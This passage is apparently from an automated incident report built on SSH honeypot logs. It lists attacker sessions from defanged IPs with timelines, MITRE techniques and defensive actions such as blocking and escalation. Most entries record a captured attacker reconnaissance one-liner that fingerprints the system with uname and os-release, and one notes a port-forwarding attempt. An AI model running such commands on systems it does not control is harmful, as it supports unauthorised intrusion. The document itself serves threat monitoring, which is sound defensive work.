| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.success` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:08` | `cowrie.command.input` |
| `2026-07-24 19:40:10` | `cowrie.log.closed` |
| `2026-07-24 19:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafea9cb04b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:41 |
| **Last Seen** | 2026-07-24 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:41:01` | `cowrie.session.connect` |
| `2026-07-24 19:41:02` | `cowrie.client.version` |
| `2026-07-24 19:41:02` | `cowrie.client.kex` |
| `2026-07-24 19:41:03` | `cowrie.login.success` |
| `2026-07-24 19:41:04` | `cowrie.session.params` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.success` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:04` | `cowrie.command.input` |
| `2026-07-24 19:41:05` | `cowrie.log.closed` |
| `2026-07-24 19:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f72e8eed0f4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:41 |
| **Last Seen** | 2026-07-24 19:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:41:10` | `cowrie.session.connect` |
| `2026-07-24 19:41:11` | `cowrie.client.version` |
| `2026-07-24 19:41:11` | `cowrie.client.kex` |
| `2026-07-24 19:41:14` | `cowrie.login.success` |
| `2026-07-24 19:41:16` | `cowrie.session.params` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.success` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:16` | `cowrie.command.input` |
| `2026-07-24 19:41:17` | `cowrie.log.closed` |
| `2026-07-24 19:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e4d9e84fa8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:42 |
| **Last Seen** | 2026-07-24 19:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:42:18` | `cowrie.session.connect` |
| `2026-07-24 19:42:18` | `cowrie.client.version` |
| `2026-07-24 19:42:18` | `cowrie.client.kex` |
| `2026-07-24 19:42:21` | `cowrie.login.success` |
| `2026-07-24 19:42:23` | `cowrie.session.params` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.success` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.command.input` |
| `2026-07-24 19:42:23` | `cowrie.log.closed` |
| `2026-07-24 19:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a86798d331b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:42 |
| **Last Seen** | 2026-07-24 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:42:46` | `cowrie.session.connect` |
| `2026-07-24 19:42:47` | `cowrie.client.version` |
| `2026-07-24 19:42:47` | `cowrie.client.kex` |
| `2026-07-24 19:42:48` | `cowrie.login.success` |
| `2026-07-24 19:42:49` | `cowrie.session.params` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.success` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:49` | `cowrie.command.input` |
| `2026-07-24 19:42:50` | `cowrie.log.closed` |
| `2026-07-24 19:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728088145e0b

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-24 19:43 |
| **Last Seen** | 2026-07-24 19:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:43:02` | `cowrie.session.connect` |
| `2026-07-24 19:43:03` | `cowrie.client.version` |
| `2026-07-24 19:43:03` | `cowrie.client.kex` |
| `2026-07-24 19:43:05` | `cowrie.login.success` |
| `2026-07-24 19:43:06` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89eb6fa2847

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:43 |
| **Last Seen** | 2026-07-24 19:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:43:27` | `cowrie.session.connect` |
| `2026-07-24 19:43:27` | `cowrie.client.version` |
| `2026-07-24 19:43:27` | `cowrie.client.kex` |
| `2026-07-24 19:43:30` | `cowrie.login.success` |
| `2026-07-24 19:43:32` | `cowrie.session.params` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.success` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:32` | `cowrie.command.input` |
| `2026-07-24 19:43:34` | `cowrie.log.closed` |
| `2026-07-24 19:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26967c105826

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-07-24 19:44 |
| **Last Seen** | 2026-07-24 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:44:25` | `cowrie.session.connect` |
| `2026-07-24 19:44:25` | `cowrie.client.version` |
| `2026-07-24 19:44:25` | `cowrie.client.kex` |
| `2026-07-24 19:44:25` | `cowrie.login.success` |
| `2026-07-24 19:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95a6214662b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-24 19:44 |
| **Last Seen** | 2026-07-24 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:44:25` | `cowrie.session.connect` |
| `2026-07-24 19:44:25` | `cowrie.client.version` |
| `2026-07-24 19:44:25` | `cowrie.client.kex` |
| `2026-07-24 19:44:25` | `cowrie.login.success` |
| `2026-07-24 19:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e11905c4259

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:44 |
| **Last Seen** | 2026-07-24 19:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:44:33` | `cowrie.session.connect` |
| `2026-07-24 19:44:33` | `cowrie.client.version` |
| `2026-07-24 19:44:33` | `cowrie.client.kex` |
| `2026-07-24 19:44:34` | `cowrie.login.success` |
| `2026-07-24 19:44:35` | `cowrie.session.params` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.success` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:35` | `cowrie.command.input` |
| `2026-07-24 19:44:36` | `cowrie.log.closed` |
| `2026-07-24 19:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fe8621fe06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:44 |
| **Last Seen** | 2026-07-24 19:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:44:33` | `cowrie.session.connect` |
| `2026-07-24 19:44:34` | `cowrie.client.version` |
| `2026-07-24 19:44:34` | `cowrie.client.kex` |
| `2026-07-24 19:44:38` | `cowrie.login.success` |
| `2026-07-24 19:44:40` | `cowrie.session.params` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.success` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:40` | `cowrie.command.input` |
| `2026-07-24 19:44:41` | `cowrie.log.closed` |
| `2026-07-24 19:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed2c33eda8d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:45 |
| **Last Seen** | 2026-07-24 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:45:43` | `cowrie.session.connect` |
| `2026-07-24 19:45:43` | `cowrie.client.version` |
| `2026-07-24 19:45:43` | `cowrie.client.kex` |
| `2026-07-24 19:45:46` | `cowrie.login.success` |
| `2026-07-24 19:45:49` | `cowrie.session.params` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.success` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.command.input` |
| `2026-07-24 19:45:49` | `cowrie.log.closed` |
| `2026-07-24 19:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50d7af7ec806

| Field | Detail |
|---|---|
| **Source IP** | `43.110.38[.]5` |
| **First Seen** | 2026-07-24 19:45 |
| **Last Seen** | 2026-07-24 19:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:45:52` | `cowrie.session.connect` |
| `2026-07-24 19:45:52` | `cowrie.client.version` |
| `2026-07-24 19:45:52` | `cowrie.client.kex` |
| `2026-07-24 19:45:54` | `cowrie.login.success` |
| `2026-07-24 19:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.110.38[.]5` to AbuseIPDB if not already reported
- [ ] Block `43.110.38[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b65668c278

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-24 19:45 |
| **Last Seen** | 2026-07-24 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:45:56` | `cowrie.session.connect` |
| `2026-07-24 19:45:56` | `cowrie.client.version` |
| `2026-07-24 19:45:56` | `cowrie.client.kex` |
| `2026-07-24 19:45:56` | `cowrie.login.success` |
| `2026-07-24 19:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ed42bf01696

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:46 |
| **Last Seen** | 2026-07-24 19:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:46:17` | `cowrie.session.connect` |
| `2026-07-24 19:46:17` | `cowrie.client.version` |
| `2026-07-24 19:46:17` | `cowrie.client.kex` |
| `2026-07-24 19:46:18` | `cowrie.login.success` |
| `2026-07-24 19:46:19` | `cowrie.session.params` |
| `2026-07-24 19:46:19` | `cowrie.command.input` |
| `2026-07-24 19:46:19` | `cowrie.command.input` |
| `2026-07-24 19:46:19` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.success` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.command.input` |
| `2026-07-24 19:46:20` | `cowrie.log.closed` |
| `2026-07-24 19:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb1e76da79b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:46 |
| **Last Seen** | 2026-07-24 19:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:46:50` | `cowrie.session.connect` |
| `2026-07-24 19:46:51` | `cowrie.client.version` |
| `2026-07-24 19:46:51` | `cowrie.client.kex` |
| `2026-07-24 19:46:54` | `cowrie.login.success` |
| `2026-07-24 19:46:56` | `cowrie.session.params` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.success` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:56` | `cowrie.command.input` |
